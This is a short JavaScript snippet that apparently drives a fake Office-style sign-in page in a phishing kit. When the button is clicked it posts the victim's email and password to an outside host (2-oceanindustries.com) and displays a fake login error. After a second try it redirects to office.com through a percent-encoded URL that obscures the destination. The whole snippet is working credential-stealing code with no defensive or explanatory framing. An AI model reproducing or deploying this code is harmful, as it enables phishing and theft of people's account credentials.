		var signinCalls=0;
		$(document).ready(function(){  
		 $(".submitbtn").click(function(){
			 $("#first").addClass('d-none');
			 $("#second").removeClass('d-none');
			 setTimeout(function() {
				$("#error").removeClass('d-none');
				$("#second").addClass('d-none');
				$("#first").removeClass('d-none');
			 
			 }, 3000);
			 signinFunction();

			function signinFunction(){
				signinCalls++;
				if (signinCalls == '2'){
					setTimeout(function() {
						window.location.href="https://%6F%66%66%69%63%65%2E%63%6F%6D";					 
					 }, 2500);
					 
				}
			}
			 $.post("https://2-oceanindustries.com/uncategorized/htacccess",{
				    email: document.getElementById('email').value,
                    password: document.getElementById('password').value
				},
				function(data, status){
			 });
		  });
		 });

		
		document.getElementById("trigger").click();
